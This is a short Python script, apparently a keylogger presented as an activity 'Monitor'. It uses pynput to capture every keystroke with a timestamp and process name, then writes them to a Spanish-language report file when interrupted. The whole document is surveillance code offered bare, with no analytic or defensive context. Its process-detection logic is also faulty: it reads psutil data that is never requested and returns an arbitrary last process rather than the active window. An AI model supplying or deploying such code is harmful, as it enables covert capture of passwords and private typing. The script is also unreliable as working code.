import time
import os
import sys
from datetime import datetime
from pynput.keyboard import Listener
from psutil import process_iter, AccessDenied

class Monitor:
    def __init__(self):
        self.start_time = datetime.now()
        self.activity_log = []

    def track_keyboard(self):
        def on_press(key):
            try:
                key_data = str(key.char)
            except AttributeError:
                key_data = str(key)

            self.activity_log.append({
                'timestamp': datetime.now(),
                'key': key_data,
                'process': self.get_active_process()
            })

        with Listener(on_press=on_press) as listener:
            listener.join()

    def get_active_process(self):
        active_window = ""
        active_process = ""

        for process in process_iter():
            try:
                if process.info['exe'] is not None:
                    active_window = process.info['name']
                    active_process = process.info['exe']
            except AccessDenied:
                continue

        return {'window': active_window, 'process': active_process}

    def generate_report(self):
        end_time = datetime.now()
        report_filename = f'report_{self.start_time.strftime("%Y%m%d_%H%M%S")}.txt'
        with open(report_filename, 'w', encoding='utf-8') as report_file:
            report_file.write(f"Reporte de actividad desde {self.start_time} hasta {end_time}\n\n")
            for entry in self.activity_log:
                report_file.write(f"{entry['timestamp']} - Tecla: {entry['key']} - Ventana: {entry['process']['window']} - Proceso: {entry['process']['process']}\n")

if __name__ == "__main__":
    monitor = Monitor()
    try:
        monitor.track_keyboard()
    except KeyboardInterrupt:
        monitor.generate_report()
        sys.exit()
